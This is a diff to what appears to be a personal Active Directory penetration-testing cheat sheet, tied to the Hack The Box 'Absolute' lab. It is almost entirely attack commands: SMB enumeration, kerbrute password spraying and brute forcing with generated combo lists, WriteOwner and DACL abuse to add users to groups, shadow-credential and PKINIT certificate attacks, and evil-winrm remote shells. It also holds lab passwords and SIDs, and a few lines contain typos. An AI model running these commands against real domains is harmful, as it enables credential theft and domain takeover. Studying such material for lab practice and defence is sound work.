@@ -17,6 +17,8 @@ enum4linux -a -u "$dom\\$user" -p $pass $ip
 enum4linux -a -u "$dom\\$user" -p "" -M -l -d $ip 2>&1
 enum4linux -a -u "" -p "" $ip && enum4linux -a -u "guest" -p "" $ip
 enum4linux -a -M -l -d $dom 2>&1 && enum4linux-ng $dom -A -C
+enum4linux -a -u "" -p "" $ip && enum4linux -a -u "guest" -p "" $ip
+enum4linux -a -u "$dom\\$user" -M -l -d $dom 2>&1 && enum4linux-ng $dom -u $user -p $pass -A -C
 
 enum4linux-ng $ip
 enum4linux-ng $ip -A -C
@@ -72,6 +74,7 @@ ldeep ldap -u $user -p $pass -d $dom -s ldap://$dom add_to_group "CN=TRACY WHITE
 /opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Usernames/xato-net-10-million-usernames-dup-lowercase.txt -t 100
 cewl -g --with-numbers -d 20 $url |grep -v CeWL > custom-wordlist.txt
 hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule custom-wordlist.txt >> custom-passwords.txt
+awk 'NR==FNR {a[$1]; next} {for (i in a) print $1 ":" i}' custom-passwords.txt users.txt > combined.txt
 /opt/kerbrute bruteuser -d $dom custom-passwords.txt administrator --dc $ip
 for i in $(cat users.txt); do echo "$i:$i" >> combo.txt; done
 /opt/kerbrute bruteforce combo.txt -d $dom --dc $ip
@@ -94,6 +97,13 @@ impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom"/"$
 
 /opt/windows/nxc.sh $ip
 
+sudo cp /etc/krb5.conf /etc/krb5user.bak
+python /opt/evil-winrm-krb-configurator.py $dom dc
+export KRB5_CONFIG=/etc/krb5.conf
+export KRB5CCNAME=/tmp/krb5cc_1000
+kinit d.klay@ABSOLUTE.HTB
+klist
+
 impacket-mssqlclient $user:$pass@$ip -windows-auth
 impacket-mssqlclient $dom/$user:$pass@$ip -windows-auth
 nxc mssql -d $dom -u discovery -p 'Start123!' -x "whoami" 192.168.165.40 -q 'SELECT name FROM master.dbo.sysdatabases;'
@@ -112,14 +122,28 @@ impacket-GetUserSPNs -dc-ip $ip "$dom/$user:$pass" -request-user "target" # Grab
 python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass set object $user servicePrincipalName # Grab the ticket
 python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass set password 'iain.white' "$pass" # GenericAll or GenericWrite
 
-getTGT.py $dom/$user:$pass
+If you own a Group, you can add your own attributes, such as AddMember privilege. Ensure that you are a part of that group at some point as this isnt always the case.
+owneredit.py "$dom"/"$user":"$pass" -k -action write -new-owner "$user" -target-dn 'DC=ABSOLUTE,DC=HTB' -target "NETWORK AUDIT" -dc-ip $ip # writeowner on group trust abuse, genie granting himself unlimited wishes
+dacledit.py "$dom"/"$user":"$pass" -k -action write -target-dn 'DC=ABSOLUTE,DC=HTB' -dc-ip $ip  -principal "$user"-dc-ip $ip # grant ability to write new members, anything with group
+dacledit.py "$dom"/"$user":"$pass" -k -action write -target-dn 'DC=ABSOLUTE,DC=HTB' -dc-ip $ip  -principal "$user"-dc-ip $ip # verify
+python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k add groupMember "S-1-5-21-4078382237-1492182817-2568127209-1119" "S-1-5-21-4078382237-1492182817-2568127209-1116" # add 1116 to 1119
+python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k get object "S-1-5-21-4078382237-1492182817-2568127209-1116" # verify 
+net rpc group addmem "Network Audit" $user -U $dom/$user:$pass -S $dc
+net rpc group members "Network Audit" -U $user -k -S $dc # verify
+getTGT.py $dom/$user:$pass # -dc-ip $dc
+export KRB5CCNAME=m.lovegod.ccache
+python pywhisker.py -d $dom -u $user -k  -t "winrm_user" --action "add"  --dc-ip $ip
+python /opt/PKINITtools/gettgtpkinit.py $dom/winrm_user -cert-pfx XprBXoPu.pfx -pfx-pass SYBO85IL98n9g0vAfoWm winrm.ccache
+export KRB5CCNAME=winrm.ccache
+evil-winrm -i $dc -r $dom
 
-python /opt/evil-winrm-krb-configurator.py $dom dc
-sudo cp /etc/krb5.conf /etc/krb5user.conf
-export KRB5_CONFIG=/etc/krb5.conf
-export KRB5_CONFIG=/tmp/krb5cc_1000
-kinit d.klay@ABSOLUTE.HTB
-klist
+certipy-ad find -username $user@$dom -k -target $dc
+certipy shadow auto -k -no-pass -u $dom/$user@$dc -dc-ip $ip -target $dc -account winrm_user
+KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.ht
+
+openssl pkcs12 -in file.pfx -out pub.pem -nokeys
+openssl pkcs12 -in file.pfx -out priv.pem
+evil-winrm -i $ip -P 5986 -c pub.pem -k priv.pem -S -r $dom
 
 KRB5CCNAME=/home/kali/htb/absolute/svc_smb.ccache nxc ldap -u $user -p $pass -k -M adcs $dc
 ldapsearch -H ldap://dc.absolute.htb -b "dc=absolute,dc=htb"
@@ -131,4 +155,4 @@ Invoke-ADEnum -AllEnum -Force
 .\Seatbelt.exe -group=all
 ```
 
-"https://www.thehacker.recipes/ad/movement/""
+"https://www.thehacker.recipes/ad/movement/"
